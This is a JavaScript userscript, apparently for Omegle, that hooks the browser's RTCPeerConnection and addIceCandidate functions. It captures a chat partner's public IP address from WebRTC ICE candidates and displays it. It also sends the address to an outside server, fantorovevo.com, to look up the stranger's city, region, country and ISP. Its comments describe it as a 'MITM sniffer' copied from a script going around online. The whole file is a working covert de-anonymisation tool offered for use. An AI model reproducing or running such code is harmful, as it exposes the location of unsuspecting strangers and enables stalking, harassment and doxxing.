const apiUrl = "https://fantorovevo.com";

// This code can break at any time but I didn't feel like completely reversing Omegle's
// JavaScript cuz it's (obviously) written to be hard to read so I'm just creating
// all the elements n stuff myself lol
function printInChat(msg) {
	let logbox = document.getElementsByClassName("logbox")[0];
	let log = logbox.children[0];

	let item = document.createElement("DIV"); item.className = "logitem";
	log.appendChild(item);

	let text = document.createElement("P"); text.className = "statuslog";
	text.innerText = msg;
	item.appendChild(text);

	return item;
}

function getIpInfo(addr) {
	let xhttp = new XMLHttpRequest();

	xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			let data = JSON.parse(this.responseText);
			printInChat("Stranger's approximate location: " +
				data["city"] + ", " +
				data["regionName"] + ", " +
				data["country"]);
			printInChat("Stranger's ISP: " + data["isp"]);
		}
	}

	xhttp.open("GET", apiUrl + "/whois.php?ip=" + addr);
	xhttp.send();
}

// We're basically setting up a MITM sniffer on the browser's RTC client so we're
// overlaying the RTCPeerConnection constructor with code that captures the stranger's
// IP address
//
// Code pretty much copy-pasted from a script going around online
// I didn't feel like actually looking into how RTC does things so I just took
// this script and tried to understand it
window.RPC = window.RPC || window.RTCPeerConnection

// Overwrite original RTCPeerConnection() constructor
window.RTCPeerConnection = function(...passedArgs) {
	// Pass the arguments to the original RTCPeerConnection() constructor
	const rpc = new window.RPC(...passedArgs);

	// Copy the original addIceCandidate()
	rpc.aic = rpc.addIceCandidate;

	// Overwrite addIceCandidate()
	rpc.addIceCandidate = function(iceCandidate, ...passedIceArgs) {
		// Get candidate string
		const candidateString = iceCandidate.candidate.split(" ");

		// Check if candidate type is server reflexive
		if (candidateString[7] === "srflx") {
			// Print out the IP address in the candidate string
			printInChat("Stranger's IP address: " + candidateString[4]);
			getIpInfo(candidateString[4]);
		}

		// Return whatever the method would normally return
		return rpc.aic(iceCandidate, ...passedIceArgs);
	}

	// Return the object
	return rpc;
}

console.log("OMEGLE IPINFO LOADED!");
